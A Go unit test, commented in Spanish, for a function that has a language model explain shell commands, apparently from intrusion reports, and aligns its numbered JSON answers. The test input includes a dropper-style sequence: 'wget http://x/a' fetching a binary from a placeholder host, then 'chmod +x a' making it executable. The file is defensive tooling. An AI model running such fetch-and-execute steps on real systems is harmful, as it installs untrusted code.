package report

import (
	"context"
	"testing"
)

type explicadorFalso struct{ resp string }

func (e explicadorFalso) Preguntar(_ context.Context, _, _ string, _ int) (string, error) {
	return e.resp, nil
}

func TestGlosarComandosAlineaYtolera(t *testing.T) {
	// El modelo devuelve el JSON envuelto en vallas y con una clave de mas;
	// la 3 falta a proposito. Debe alinear por numero y dejar vacia la que
	// no viene, sin romperse.
	e := explicadorFalso{resp: "Claro:\n```json\n{\"1\":\"comprueba la distro\",\"2\":\"baja el binario\",\"4\":\"sobra\"}\n```"}
	g, err := GlosarComandos(context.Background(), e, []string{"[ -f /etc/os-release ]", "wget http://x/a", "chmod +x a"}, "es", 500)
	if err != nil {
		t.Fatal(err)
	}
	if len(g) != 3 {
		t.Fatalf("esperaba 3 glosas, hay %d", len(g))
	}
	if g[0] != "comprueba la distro" || g[1] != "baja el binario" {
		t.Fatalf("mal alineado: %#v", g)
	}
	if g[2] != "" {
		t.Fatalf("la 3 deberia quedar vacia, es %q", g[2])
	}
}
